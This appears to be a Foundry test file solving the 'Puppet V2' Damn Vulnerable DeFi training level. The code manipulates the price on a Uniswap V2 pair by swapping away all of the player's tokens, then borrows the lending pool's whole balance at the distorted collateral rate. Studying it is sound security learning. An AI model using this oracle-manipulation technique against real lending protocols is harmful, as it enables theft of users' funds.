// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/puppet-v2/PuppetV2Level.sol";

import "../../src/utils/DamnValuableToken.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "solmate/src/tokens/WETH.sol";

interface IPuppetPool {
  function borrow(uint256) external;
  function calculateDepositOfWETHRequired(uint256) external returns (uint256);
}

contract PuppetV2Test is Test {
  PuppetV2Level level = new PuppetV2Level();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    uint256 POOL_INITIAL_TOKEN_BALANCE = level.POOL_INITIAL_TOKEN_BALANCE();
    uint256 PLAYER_INITIAL_TOKEN_BALANCE = level.PLAYER_INITIAL_TOKEN_BALANCE();

    DamnValuableToken token = DamnValuableToken(level.token());
    IPuppetPool lendingPool = IPuppetPool(address(level.lendingPool()));
    IUniswapV2Router01 uniswapRouter = IUniswapV2Router01(address(level.uniswapRouter()));
    WETH weth = WETH(level.weth());

    // go to the exchange, get all the weth you can
    // this will make the token cheaper to eth.
    token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    uniswapRouter.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp + 1);

    // wrap your eth into weth, then approve the borrow transfer
    uint256 weth_required = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
    weth.deposit{value: weth_required}();
    weth.approve(address(lendingPool), weth_required);

    weth.balanceOf(address(this));

    // attack
    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

    level.validate();
  }

  receive() external payable {}
}
